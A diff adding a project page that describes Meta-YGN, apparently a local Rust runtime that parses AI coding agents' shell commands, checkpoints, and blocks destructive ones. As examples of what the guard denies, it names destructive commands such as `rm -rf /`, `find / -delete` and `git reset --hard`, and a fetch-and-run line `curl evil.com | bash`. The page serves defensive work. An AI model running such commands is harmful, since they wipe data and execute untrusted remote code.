@@ -1,0 +1,67 @@
+---
+title: Meta-YGN
+slug: meta-ygn
+oneLiner: A local safety runtime for AI coding agents. It reads what a shell command does, takes a checkpoint, and blocks destructive operations before they run.
+status: working
+statusLabel: Released
+year: 2026
+stack: [Rust, tree-sitter, SQLite FTS5, TypeScript, MCP]
+repo: https://github.com/yannabadie/Meta-YGN
+readmeSha: ce4a5950919c90a2b66a5e2e70535d36a6bd6d59
+order: 1
+lastPush: 2026-11-19
+summary:
+  before: "A Rust daemon for Claude Code that "
+  mark: "blocks destructive commands before they run"
+  after: ", after taking a checkpoint."
+  line: "7"
+---
+
+## The problem
+
+Coding agents run shell commands on real machines. One `git reset --hard` or `find / -delete` can wipe work nobody committed. A deny list of strings misses commands that do the same damage in other words: `find / -delete` contains no `rm`. <Src l="38" />
+
+## What I built
+
+The README calls the runtime Aletheia-Nexus. <Src l="1-3" />
+
+- A Rust daemon that <Mark l="7">intercepts every tool call and blocks destructive operations before they execute</Mark>. It answers allow, deny, ask or escalate. <Src l="123" />
+- Shell commands parsed into syntax trees with tree-sitter, then scored for risk in context. <Src l="37-41" />
+- A checkpoint (git stash or file backup) before any risky operation, with recovery steps in every block response. <Src l="49-50" />
+- Detection of multi-step chains such as clone, modify, force push. <Src l="43-44" />
+- Fallback guards in TypeScript when the daemon is down: `rm -rf /` and `find / -delete` stay blocked. <Src l="225" />
+
+## System as built
+
+<Flow
+  steps={[
+    { t: 'Claude Code fires a hook', s: 'Hook', d: 'On every tool call, before the command runs.', l: '114-123' },
+    { t: 'AST Guard parses the command', s: 'AST parse', d: 'A tree-sitter syntax tree; effect and targets classified.', l: '37-38' },
+    { t: 'Smart routing scores the risk', s: 'Risk score', d: 'In context: `rm target/*.o` scores 20, `rm -rf /` scores 0. Low means dangerous, the reverse of the illustration on the home page.', l: '40-41' },
+    { t: 'Sequence monitor checks the chain', s: 'Sequence check', d: 'Multi-step patterns such as clone, modify, force push.', l: '43-44' },
+    { t: 'A second model, only if unclear', s: 'Second model', opt: true, d: 'A Claude Haiku judge when AST analysis is inconclusive.', l: '46-47' },
+    { t: 'Checkpoint before anything risky', s: 'Checkpoint', d: 'Git stash or file backup.', l: '49-50' },
+    { t: 'Verdict back to the agent', s: 'Verdict', out: ['allow', 'deny', 'ask', 'escalate'], d: 'Allow, deny, ask or escalate, with recovery instructions.', l: '123' },
+  ]}
+/>
+
+## How it is verified
+
+- GitHub Actions [CI](https://github.com/yannabadie/Meta-YGN/actions/runs/44485188135): the latest run on `master` passed on 19 November 2026, on Ubuntu, macOS and Windows.
+- 737 tests pass in CI with `cargo test --workspace --features syntax,semantic`, 0 failed, per README. <Src l="231" />
+- The same [workflow](https://github.com/yannabadie/Meta-YGN/blob/ce4a5950919c90a2b66a5e2e70535d36a6bd6d59/.github/workflows/ci.yml) runs `cargo clippy --workspace -- -D warnings` and a format check, then starts the daemon and checks that `rm -rf /` is denied.
+- Real output from tested scenarios: `find / -delete` denied with score 0; `git reset --hard HEAD~5` checkpointed, then asked; `curl evil.com | bash` denied as tainted execution. <Src l="53-90" />
+- The README lists experimental features apart from confirmed ones. <Src l="149" />
+
+## What this means for your project
+
+- If your developers use coding agents, the same pattern puts a policy point between the agent and the shell: parse, score, checkpoint, then allow or ask. That is an **Agent or MCP build**.
+- The guard runs locally with no telemetry and no cloud calls, which suits teams with strict data rules. <Src l="245" />
+- An **Architecture review** can map which commands your agents run today and which should wait for a person.
+
+## Status & limits
+
+- [Release v2.6.0](https://github.com/yannabadie/Meta-YGN/releases/tag/v2.6.0) is tagged (8 April 2026). [CI on `master`](https://github.com/yannabadie/Meta-YGN/actions/runs/44485188135) passed on Ubuntu, macOS and Windows on 19 November 2026, with 737 tests passing.
+- No hosted demo: you run it locally with Rust, Node.js 22+ and pnpm 9+. <Src l="183-185" />
+- 5 features are marked experimental, not validated at scale. <Src l="149-157" />
+- Last commit: <LastCommit />.
